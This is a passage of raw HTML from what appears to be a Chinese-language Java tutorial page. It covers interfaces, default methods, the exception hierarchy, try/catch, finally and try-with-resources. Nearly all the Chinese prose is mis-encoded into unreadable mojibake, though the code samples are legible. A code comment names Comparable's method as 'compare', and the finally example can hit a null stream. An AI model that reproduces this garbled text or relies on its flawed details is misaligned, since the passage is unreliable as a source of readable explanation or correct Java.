title="æ¥å£"></a>æ¥å£</h3><p>æ¥å£ç”¨æ¥æè¿°ç±»åº”è¯¥åšä»€ä¹ˆï¼Œè€Œä¸æŒ‡å®šå®ƒä»¬å…·ä½“åº”è¯¥æ€ä¹ˆåšã€‚</p><p>æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•éƒ½è‡ªåŠ¨æ˜¯<code>public</code>æ–¹æ³•ã€‚å› æ­¤ï¼Œåœ¨æ¥å£ä¸­å£°æ˜æ–¹æ³•æ—¶ï¼Œä¸å¿…æä¾›å…³é”®å­—<code>public</code>ã€‚</p><p>æ¥å£å¯ä»¥å®šä¹‰å¸¸é‡ï¼Œä½†æ˜¯æ¥å£<strong>ç»ä¸ä¼š</strong>æœ‰å®ä¾‹å­—æ®µã€‚</p><p>æä¾›å®ä¾‹å­—æ®µå’Œæ–¹æ³•å®ç°çš„ä»»åŠ¡åº”è¯¥ç”±å®ç°æ¥å£çš„é‚£ä¸ªç±»æ¥å®Œæˆã€‚å› æ­¤ï¼Œå¯ä»¥å°†æ¥å£çœ‹æˆæ˜¯æ²¡æœ‰å®ä¾‹å­—æ®µçš„æŠ½è±¡ç±»ã€‚ï¼ˆä½†æ˜¯ä¸¤ä¸ªæ¦‚å¿µè¿˜æ˜¯æœ‰ä¸€å®šåŒºåˆ«çš„ï¼‰</p><p>è®©ç±»å®ç°ä¸€ä¸ªæ¥å£ï¼Œé€šå¸¸éœ€è¦å®Œæˆä¸‹é¢ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ol><li>å°†ç±»å£°æ˜ä¸ºå®ç°ç»™å®šçš„æ¥å£ã€‚</li><li>å¯¹æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•æä¾›å®šä¹‰ã€‚</li></ol><p>è¦å°†ç±»å£°æ˜ä¸ºå®ç°æŸä¸ªæ¥å£ï¼Œéœ€è¦ä½¿ç”¨å…³é”®å­—<code>implements</code>ã€‚</p><blockquote><p>åœ¨æ¥å£å£°æ˜ä¸­ï¼Œæ²¡æœ‰å°†<code>compareTo</code>æ–¹æ³•å£°æ˜ä¸º<code>public</code>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•éƒ½è‡ªåŠ¨æ˜¯<code>public</code>ã€‚ä¸è¿‡ï¼Œåœ¨å®ç°æ¥å£æ—¶ï¼Œå¿…é¡»æŠŠæ–¹æ³•å£°æ˜ä¸º<code>public</code>ï¼›å¦åˆ™ï¼Œç¼–è¯‘å™¨å°†è®¤ä¸ºè¿™ä¸ªæ–¹æ³•çš„è®¿é—®å±æ€§æ˜¯åŒ…å¯è§æ€§ï¼Œè¿™æ˜¯ç±»çš„é»˜è®¤è®¿é—®å±æ€§ã€‚</p></blockquote><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> other<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">,</span>other<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token comment">//åœ¨Java5ä¸­ï¼ŒComparableæ¥å£å·²ç»æå‡ä¸ºä¸€ä¸ªæ³›å‹ç±»å‹ã€‚</span><span class="token comment">/*public interface Comparable&lt;T>&#123;int compare(T other);&#125;*/</span></code></pre><h4 id="æ¥å£çš„å±æ€§"><a href="#æ¥å£çš„å±æ€§" class="headerlink" title="æ¥å£çš„å±æ€§"></a>æ¥å£çš„å±æ€§</h4><p>æ¥å£ä¸æ˜¯ç±»ã€‚å…·ä½“åœ°è¯´ï¼Œä¸èƒ½ä½¿ç”¨<code>new</code>è¿ç®—ç¬¦å®ä¾‹åŒ–ä¸€ä¸ªæ¥å£ã€‚</p><p>å°½ç®¡ä¸èƒ½æ„é€ æ¥å£çš„å¯¹è±¡ï¼Œå´èƒ½å£°æ˜æ¥å£çš„å˜é‡ã€‚æ¥å£å˜é‡ä¹Ÿå¿…é¡»å¼•ç”¨å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»å¯¹è±¡ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Comparable</span> x<span class="token punctuation">;</span>x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä¹Ÿå¯ä»¥ç”¨<code>instanceof</code>æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å®ç°äº†æŸä¸ªç‰¹å®šçš„æ¥å£ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Employee</span> feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>feng <span class="token keyword">instanceof</span> <span class="token class-name">Comparable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸å»ºç«‹ç±»çš„ç»§æ‰¿å±‚æ¬¡ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥æ‹“å±•æ¥å£ã€‚</p><p>è™½ç„¶åœ¨æ¥å£ä¸­ä¸èƒ½åŒ…å«å®ä¾‹å­—æ®µï¼Œä½†æ˜¯å¯ä»¥åŒ…å«å¸¸é‡ã€‚ </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Moveable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">,</span> <span class="token keyword">double</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> <span class="token constant">SPEED_LIMIT</span><span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸æ¥å£ä¸­çš„æ–¹æ³•éƒ½è‡ªåŠ¨è¢«è®¾ç½®ä¸º<code>public</code>ä¸€æ ·ï¼Œæ¥å£ä¸­çš„å­—æ®µæ€»æ˜¯<code>public static final</code>ã€‚</p><p>å°½ç®¡æ¯ä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ªè¶…ç±»ï¼Œä½†å´å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚å¯ä»¥ä½¿ç”¨é€—å·å°†æƒ³è¦å®ç°çš„å„ä¸ªæ¥å£åˆ†éš”å¼€ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span><span class="token punctuation">,</span> <span class="token class-name">Comparable</span></code></pre><p>å®é™…ä¸Šï¼Œæ¥å£å¯ä»¥æä¾›å¤šé‡ç»§æ‰¿çš„å¤§å¤šæ•°å¥½å¤„ï¼ŒåŒæ—¶è¿˜èƒ½é¿å…å¤šé‡ç»§æ‰¿çš„å¤æ‚æ€§å’Œä½æ•ˆæ€§ã€‚</p><h4 id="é»˜è®¤æ–¹æ³•"><a href="#é»˜è®¤æ–¹æ³•" class="headerlink" title="é»˜è®¤æ–¹æ³•"></a>é»˜è®¤æ–¹æ³•</h4><p>å¯ä»¥ä¸ºæ¥å£æä¾›ä¸€ä¸ªé»˜è®¤å®ç°ã€‚å¿…é¡»ç”¨<code>default</code>ä¿®é¥°ç¬¦æ ‡è®°è¿™æ ·ä¸€ä¸ªæ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">default</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">T</span> other<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>é»˜è®¤æ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–æ–¹æ³•ã€‚</p><h4 id="è§£å†³é»˜è®¤æ–¹æ³•å†²çª"><a href="#è§£å†³é»˜è®¤æ–¹æ³•å†²çª" class="headerlink" title="è§£å†³é»˜è®¤æ–¹æ³•å†²çª"></a>è§£å†³é»˜è®¤æ–¹æ³•å†²çª</h4><p>å¦‚æœå…ˆåœ¨ä¸€ä¸ªæ¥å£ä¸­å°†ä¸€ä¸ªæ–¹æ³•å®šä¹‰ä¸ºé»˜è®¤æ–¹æ³•ï¼Œç„¶ååˆåœ¨è¶…ç±»æˆ–å¦ä¸€ä¸ªæ¥å£ä¸­å®šä¹‰åŒæ ·çš„æ–¹æ³•ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ</p><ol><li>è¶…ç±»ä¼˜å…ˆã€‚å¦‚æœè¶…ç±»æä¾›äº†ä¸€ä¸ªå…·ä½“çš„æ–¹æ³•ï¼ŒåŒåè€Œä¸”å…·æœ‰ç›¸åŒå‚æ•°ç±»å‹çš„é»˜è®¤æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚</li><li>æ¥å£å†²çªã€‚å¦‚æœä¸€ä¸ªæ¥å£æä¾›äº†ä¸€ä¸ªé»˜è®¤æ–¹æ³•ï¼Œå¦ä¸€ä¸ªæ¥å£æä¾›äº†ä¸€ä¸ªåŒåè€Œä¸”å‚æ•°ç±»å‹ï¼ˆä¸ç®¡æ˜¯å¦æ˜¯é»˜è®¤å‚æ•°ï¼‰ç›¸åŒçš„æ–¹æ³•ï¼Œå¿…é¡»è¦†ç›–è¿™ä¸ªæ–¹æ³•æ¥è§£å†³å†²çªã€‚</li></ol><p>ä¸¤ä¸ªæ¥å£å¦‚æœå†²çªå¹¶ä¸é‡è¦ã€‚å¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªæ¥å£æä¾›äº†ä¸€ä¸ªå®ç°ï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥å‘Šé”™è¯¯ï¼Œç¨‹åºå‘˜å°±å¿…é¡»è§£å†³è¿™ä¸ªäºŒä¹‰æ€§ã€‚</p><h3 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h3><h4 id="å¤„ç†é”™è¯¯"><a href="#å¤„ç†é”™è¯¯" class="headerlink" title="å¤„ç†é”™è¯¯"></a>å¤„ç†é”™è¯¯</h4><p>å¼‚å¸¸å¤„ç†çš„ä»»åŠ¡å°±æ˜¯å°†æ§åˆ¶æƒä»äº§ç”Ÿé”™è¯¯çš„åœ°æ–¹è½¬ç§»åˆ°èƒ½å¤Ÿå¤„ç†è¿™ç§æƒ…å†µçš„é”™è¯¯å¤„ç†å™¨ã€‚</p><p>åœ¨Javaä¸­ï¼Œå¦‚æœæŸä¸ªæ–¹æ³•ä¸èƒ½å¤Ÿé‡‡ç”¨æ­£å¸¸çš„é€”å¾„å®Œæˆå®ƒçš„ä»»åŠ¡ï¼Œå¯ä»¥é€šè¿‡å¦å¤–ä¸€ä¸ªè·¯å¾„é€€å‡ºæ–¹æ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ–¹æ³•å¹¶ä¸è¿”å›ä»»ä½•å€¼ï¼Œè€Œæ˜¯æŠ›å‡ºäº†ä¸€ä¸ªå°è£…äº†é”™è¯¯ä¿¡æ¯çš„å¯¹è±¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–¹æ³•å°†ä¼šç«‹åˆ»é€€å‡ºï¼Œå¹¶ä¸è¿”å›æ­£å¸¸å€¼ã€‚æ­¤å¤–ï¼Œä¹Ÿä¸ä¼šä»è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„ä»£ç ç»§ç»­æ‰§è¡Œï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå¼‚å¸¸å¤„ç†æœºåˆ¶å¼€å§‹æœç´¢èƒ½å¤Ÿå¤„ç†è¿™ç§å¼‚å¸¸çŠ¶å†µçš„å¼‚å¸¸å¤„ç†å™¨ã€‚</p><p>å¼‚å¸¸å¯¹è±¡éƒ½æ˜¯æ´¾ç”Ÿäº<code>Throwable</code>ç±»çš„ä¸€ä¸ªç±»å®ä¾‹ã€‚å¦‚æœJavaä¸­å†…ç½®çš„å¼‚å¸¸ç±»ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œç”¨æˆ·è¿˜å¯ä»¥åˆ›å»ºè‡ªå·±çš„å¼‚å¸¸ç±»ã€‚</p><p>æ‰€æœ‰çš„å¼‚å¸¸éƒ½æ˜¯æœ‰<code>Throwable</code>ç»§æ‰¿è€Œæ¥ï¼Œä½†åœ¨ä¸‹ä¸€å±‚ç«‹å³åˆ†è§£ä¸ºä¸¤ä¸ªåˆ†æ”¯ï¼š<code>Error</code>å’Œ<code>Exception</code>ã€‚</p><p><code>Erroe</code>ç±»å±‚æ¬¡ç»“æ„æè¿°äº†Javaè¿è¡Œæ—¶ç³»ç»Ÿçš„å†…éƒ¨é”™è¯¯å’Œèµ„æºè€—å°½é”™è¯¯ã€‚</p><p><code>Exception</code>ç±»å±‚æ¬¡ç»“æ„åˆåˆ†è§£ä¸ºä¸¤ä¸ªåˆ†æ”¯ï¼šä¸€ä¸ªåˆ†æ”¯æ´¾ç”Ÿäº<code>RuntimeException</code>ï¼›å¦ä¸€ä¸ªåˆ†æ”¯åŒ…å«å…¶ä»–å¼‚å¸¸ã€‚ä¸€èˆ¬çš„è§„åˆ™æ˜¯ç”±ç¼–ç¨‹é”™è¯¯å¯¼è‡´çš„å¼‚å¸¸å±äº<code>RuntimeException</code>ï¼›å¦‚æœç¨‹åºæœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†ç”±äºåƒ<code>I/O</code>é”™è¯¯è¿™ç±»é—®é¢˜å¯¼è‡´çš„å¼‚å¸¸å±äºå…¶ä»–å¼‚å¸¸ï¼ˆ<code>IOException</code>ï¼‰ã€‚</p><p>Javaè¯­è¨€è§„èŒƒå°†æ´¾ç”Ÿäº<code>Error</code>ç±»æˆ–<code>RuntimeException</code>ç±»çš„æ‰€æœ‰å¼‚å¸¸ç§°ä¸ºéæ£€æŸ¥å‹å¼‚å¸¸ï¼Œæ‰€æœ‰å…¶ä»–çš„å¼‚å¸¸ç§°ä¸ºæ£€æŸ¥å‹å¼‚å¸¸ã€‚</p><p>è¦åœ¨æ–¹æ³•çš„é¦–éƒ¨æŒ‡å‡ºè¿™ä¸ªæ–¹æ³•å¯èƒ½æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œæ‰€ä»¥è¦ä¿®æ”¹æ–¹æ³•é¦–éƒ¨ï¼Œä»¥åæ˜ è¿™ä¸ªæ–¹æ³•å¯èƒ½æŠ›å‡ºçš„æ£€æŸ¥å‹å¼‚å¸¸ã€‚å¦‚æœä¸€ä¸ªæ–¹æ³•æœ‰å¯èƒ½æŠ›å‡ºå¤šä¸ªæ£€æŸ¥å‹å¼‚å¸¸ç±»å‹ï¼Œé‚£ä¹ˆå°±å¿…é¡»åœ¨æ–¹æ³•çš„é¦–éƒ¨åˆ—å‡ºæ‰€æœ‰çš„å¼‚å¸¸ç±»ã€‚</p><ol><li>ä¸éœ€è¦å£°æ˜Javaçš„å†…éƒ¨é”™è¯¯ï¼Œå³ä»Errorç»§æ‰¿çš„å¼‚å¸¸ã€‚</li><li>ä¹Ÿä¸åº”è¯¥å£°æ˜ä»<code>RuntimeException</code>ç»§æ‰¿çš„é‚£äº›éæ£€æŸ¥å‹å¼‚å¸¸ã€‚</li></ol><blockquote><p>å¦‚æœåœ¨å­ç±»ä¸­è¦†ç›–äº†è¶…ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå­ç±»æ–¹æ³•ä¸­å£°æ˜çš„æ£€æŸ¥å‹å¼‚å¸¸ä¸èƒ½æ¯”è¶…ç±»æ–¹æ³•ä¸­å£°æ˜çš„å¼‚å¸¸æ›´é€šç”¨ï¼ˆå­ç±»æ–¹æ³•å¯ä»¥æŠ›å‡ºæ›´ç‰¹å®šçš„å¼‚å¸¸ï¼Œæˆ–è€…æ ¹æœ¬ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸ã€‚ï¼‰å¦‚æœè¶…ç±»æ–¹æ³•æ²¡æœ‰æŠ›å‡ºä»»ä½•æ£€æŸ¥å‹å¼‚å¸¸ï¼Œå­ç±»ä¹Ÿä¸èƒ½æŠ›å‡ºä»»ä½•æ£€æŸ¥å‹å¼‚å¸¸ã€‚</p></blockquote><p>å¦‚æœç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•å£°æ˜å®ƒä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œè€Œè¿™ä¸ªå¼‚å¸¸æ—¶æŸä¸ªç‰¹å®šç±»çš„å®ä¾‹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸å¯èƒ½å±äºè¿™ä¸ªç±»ï¼Œä¹Ÿå¯èƒ½å±äºè¿™ä¸ªç±»çš„ä¸€ä¸ªå­ç±»ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">EOFException</span></code></pre><p>æŠ›å‡ºå¼‚å¸¸éå¸¸å®¹æ˜“ï¼š</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å¼‚å¸¸ç±»ã€‚</li><li>åˆ›å»ºè¿™ä¸ªç±»çš„ä¸€ä¸ªå¯¹è±¡ã€‚</li><li>å°†å¯¹è±¡æŠ›å‡ºã€‚</li></ol><p>ä¸€æ—¦æ–¹æ³•æŠ›å‡ºäº†å¼‚å¸¸ï¼Œè¿™ä¸ªæ–¹æ³•å°±ä¸ä¼šè¿”å›åˆ°è°ƒç”¨è€…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¿…æ“å¿ƒå»ºç«‹ä¸€ä¸ªé»˜è®¤çš„è¿”å›å€¼æˆ–é”™è¯¯ç ã€‚</p><h4 id="åˆ›å»ºå¼‚å¸¸ç±»"><a href="#åˆ›å»ºå¼‚å¸¸ç±»" class="headerlink" title="åˆ›å»ºå¼‚å¸¸ç±»"></a>åˆ›å»ºå¼‚å¸¸ç±»</h4><p>æˆ‘ä»¬éœ€è¦åšçš„åªæ˜¯å®šä¹‰ä¸€ä¸ªæ´¾ç”Ÿäº<code>Exception</code>çš„ç±»ï¼Œæˆ–è€…æ´¾ç”Ÿäº<code>Exception</code>çš„æŸä¸ªå­ç±»ï¼Œå¦‚<code>IOException</code>ã€‚ä¹ æƒ¯åšæ³•æ˜¯ï¼Œè‡ªå®šä¹‰çš„è¿™ä¸ªç±»åº”è¯¥åŒ…å«ä¸¤ä¸ªæ„é€ å™¨ï¼Œä¸€ä¸ªæ˜¯é»˜è®¤çš„æ„é€ å™¨ï¼Œå¦ä¸€ä¸ªæ˜¯åŒ…å«è¯¦ç»†æè¿°ä¿¡æ¯çš„æ„é€ å™¨ï¼ˆè¶…ç±»<code>Throwable</code>çš„<code>toString</code>æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«è¿™ä¸ªè¯¦ç»†ä¿¡æ¯ï¼Œè¿™åœ¨è°ƒè¯•ä¸­éå¸¸æœ‰ç”¨ï¼‰ã€‚</p><h4 id="æ•è·å¼‚å¸¸"><a href="#æ•è·å¼‚å¸¸" class="headerlink" title="æ•è·å¼‚å¸¸"></a>æ•è·å¼‚å¸¸</h4><p>è¦æƒ³æ•è·ä¸€ä¸ªå¼‚å¸¸ï¼Œéœ€è¦è®¾ç½®<code>try/catch</code>è¯­å¥å—ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> in <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> exception<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    exception<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœtryè¯­å¥å—ä¸­çš„ä»»ä½•ä»£ç æŠ›å‡ºäº†catchå­å¥ä¸­æŒ‡å®šçš„ä¸€ä¸ªå¼‚å¸¸ç±»ï¼Œé‚£ä¹ˆ</p><ol><li>ç¨‹åºå°†è·³è¿‡tryè¯­å¥å—çš„å…¶ä½™ä»£ç ã€‚</li><li>ç¨‹åºå°†æ‰§è¡Œcatchå­å¥ä¸­çš„å¤„ç†å™¨ä»£ç ã€‚</li></ol><p>å¦‚æœ<code>try</code>è¯­å¥å—ä¸­çš„ä»£ç æ²¡æœ‰æŠ›å‡ºä»»ä½•å¼‚å¸¸ï¼Œé‚£ä¹ˆç¨‹åºå°†è·³è¿‡<code>catch</code>å­å¥ã€‚</p><p>å¦‚æœæ–¹æ³•ä¸­çš„ä»»ä½•ä»£ç æŠ›å‡ºäº†<code>catch</code>å­å¥ä¸­æ²¡æœ‰å£°æ˜çš„ä¸€ä¸ªå¼‚å¸¸ç±»å‹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±ä¼šç«‹å³é€€å‡ºï¼ˆå¸Œæœ›å®ƒçš„è°ƒç”¨è€…ä¸ºè¿™ç§ç±»å‹çš„å¼‚å¸¸æä¾›äº†<code>catch</code>å­å¥ï¼‰ã€‚</p><p>ä¸€èˆ¬çš„ç»éªŒæ˜¯ï¼Œè¦æ•è·é‚£äº›ä½ çŸ¥é“å¦‚ä½•å¤„ç†çš„å¼‚å¸¸ï¼Œè€Œç»§ç»­ä¼ æ’­é‚£äº›ä½ ä¸çŸ¥é“æ€æ ·å¤„ç†çš„å¼‚å¸¸ã€‚</p><h4 id="æ•è·å¤šä¸ªå¼‚å¸¸"><a href="#æ•è·å¤šä¸ªå¼‚å¸¸" class="headerlink" title="æ•è·å¤šä¸ªå¼‚å¸¸"></a>æ•è·å¤šä¸ªå¼‚å¸¸</h4><p>åœ¨ä¸€ä¸ª<code>try</code>è¯­å¥å—ä¸­å¯ä»¥æ•è·å¤šä¸ªå¼‚å¸¸ç±»å‹ï¼Œå¹¶å¯¹ä¸åŒç±»å‹çš„å¼‚å¸¸åšå‡ºä¸åŒçš„å¤„ç†ï¼Œè¦ä¸ºæ¯ä¸ªå¼‚å¸¸ç±»å‹ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„<code>catch</code>å­å¥ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>å¼‚å¸¸å¯¹è±¡å¯èƒ½åŒ…å«æœ‰å…³å¼‚å¸¸æ€§è´¨çš„ä¿¡æ¯ã€‚è¦æƒ³è·å¾—è¿™ä¸ªå¯¹è±¡çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨<code>e.getMessage()</code>å¾—åˆ°è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚</p><h4 id="finallyå­å¥"><a href="#finallyå­å¥" class="headerlink" title="finallyå­å¥"></a><code>finally</code>å­å¥</h4><p>ä¸ç®¡æ˜¯å¦æœ‰å¼‚å¸¸è¢«æ•è·ï¼Œ<code>finally</code>å­å¥ä¸­çš„ä»£ç éƒ½ä¼šè¢«æ‰§è¡Œï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token class-name">FileInputStream</span> in <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span>    <span class="token punctuation">&#123;</span>        in <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> exception<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exception<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">finally</span>    <span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å…¶å®è¿™é‡Œçš„<code>finally</code>å­å¥ä¹Ÿæœ‰å¯èƒ½æŠ›å‡ºå¼‚å¸¸ã€‚</p><blockquote><p><code>finally</code>å­å¥çš„ä½“è¦ç”¨äºæ¸…ç†èµ„æºã€‚ä¸è¦æŠŠæ”¹å˜æ§åˆ¶æµçš„è¯­å¥ï¼ˆ<code>return,throw,break,continue</code>ï¼‰æ”¾åœ¨<code>finally</code>å­å¥ä¸­ã€‚</p></blockquote><h4 id="try-with-Resourcesè¯­å¥"><a href="#try-with-Resourcesè¯­å¥" class="headerlink" title="try-with-Resourcesè¯­å¥"></a><code>try-with-Resources</code>è¯­å¥</h4><p><code>try-with-Resources</code>è¯­å¥ï¼ˆå¸¦èµ„æºçš„<code>try</code>è¯­å¥ï¼‰çš„æœ€ç®€å½¢å¼ä¸ºï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">Resource</span> res <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    work <span class="token keyword">with</span> <span class="token namespace">res</span><span class="token punctuation">&#125;</span></code></pre><p><code>try</code>å—é€€å‡ºæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<code>res.close()</code>ã€‚</p><h3 id="ä½¿ç”¨å¼‚å¸¸çš„æŠ€å·§"><a href="#ä½¿ç”¨å¼‚å¸¸çš„æŠ€å·§" class="headerlink" 